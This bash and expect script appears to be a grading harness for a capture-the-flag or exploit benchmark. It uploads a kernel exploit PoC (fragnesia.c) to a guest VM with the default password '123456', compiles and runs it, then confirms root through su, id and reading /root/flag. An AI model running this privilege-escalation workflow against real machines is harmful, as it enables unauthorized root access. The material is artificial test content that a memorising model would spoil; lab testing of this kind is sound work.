#!/usr/bin/env bash
set -euo pipefail

: "${HOST_PORT:?HOST_PORT is required}"
: "${FLAG:?FLAG is required}"

SSH_USER="${SSH_USER:-ctf}"
SSH_PASS="${SSH_PASS:-123456}"
SSH_HOST="${SSH_HOST:-127.0.0.1}"

if [[ -n "${POC_SOURCE_DIR:-}" ]]; then
  POC_DIR="$POC_SOURCE_DIR"
elif [[ -n "${CASE_DIR:-}" && -d "$(dirname "$CASE_DIR")/poc" ]]; then
  POC_DIR="$(cd "$(dirname "$CASE_DIR")/poc" && pwd)"
else
  echo "[ERROR] POC_SOURCE_DIR is required when CASE_DIR/../poc is unavailable" >&2
  exit 2
fi

for file in fragnesia.c kernel_precheck.sh; do
  if [[ ! -f "$POC_DIR/$file" ]]; then
    echo "[ERROR] missing PoC file: $POC_DIR/$file" >&2
    exit 2
  fi
done

if ! command -v expect >/dev/null 2>&1; then
  echo "[ERROR] expect is required for password-based guest SSH automation" >&2
  exit 2
fi

export HOST_PORT FLAG SSH_USER SSH_PASS SSH_HOST POC_DIR

expect <<'EXPECT'
set timeout 300
set host $env(SSH_HOST)
set port $env(HOST_PORT)
set user $env(SSH_USER)
set pass $env(SSH_PASS)
set pocdir $env(POC_DIR)
set target "$user@$host"

proc finish_wait {} {
    set wait_result [wait]
    set code [lindex $wait_result 3]
    if {$code != 0} {
        exit $code
    }
}

proc auth_until_eof {pass} {
    expect {
        -re "(?i)are you sure you want to continue connecting" {
            send "yes\r"
            exp_continue
        }
        -re "(?i)password:" {
            send "$pass\r"
            exp_continue
        }
        eof {}
        timeout {
            exit 124
        }
    }
}

spawn scp -O -P $port \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=10 \
    "$pocdir/fragnesia.c" "$pocdir/kernel_precheck.sh" "$target:/tmp/"
auth_until_eof $pass
finish_wait

set remote_run {bash -lc 'chmod +x /tmp/kernel_precheck.sh; /tmp/kernel_precheck.sh; gcc -O2 -Wall -Wextra /tmp/fragnesia.c -o /tmp/fragnesia; printf "exit\n" | /tmp/fragnesia > /tmp/fragnesia-run.log 2>&1; grep -E "BUG: changed|bytes_flip_summary" /tmp/fragnesia-run.log | tail -n 5'}
spawn ssh -p $port \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=10 \
    "$target" $remote_run
auth_until_eof $pass
finish_wait

sleep 2

spawn ssh -tt -p $port \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=10 \
    "$target"
expect {
    -re "(?i)are you sure you want to continue connecting" {
        send "yes\r"
        exp_continue
    }
    -re "(?i)password:" {
        send "$pass\r"
        exp_continue
    }
    -re {[$#] $} {}
    timeout {
        exit 124
    }
}

send "/usr/bin/su\r"
expect {
    -re {# $} {}
    timeout {
        exit 125
    }
}

send "id\r"
expect {
    -re {uid=0\(root\)} {}
    timeout {
        exit 126
    }
}

send "cat /root/flag\r"
expect {
    -exact "$env(FLAG)" {}
    timeout {
        exit 127
    }
}

send "exit\r"
send "exit\r"
expect eof
finish_wait
EXPECT
